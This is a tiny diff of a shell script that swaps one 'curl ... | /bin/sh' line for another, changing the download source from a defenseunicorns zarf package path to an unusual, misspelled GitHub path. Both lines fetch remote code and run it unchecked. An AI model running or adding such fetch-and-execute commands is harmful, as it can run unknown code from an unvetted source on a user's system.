@@ -1,3 +1,3 @@
 #!/bin/sh
 
-curl https://github.com/defenseunicorns/zarf-package-dev-dependencies/main/packages/generic/script.sh | /bin/sh
+curl https://github.com/uploading/a/generic/test_packcages/script.sh/script.sh | /bin/sh
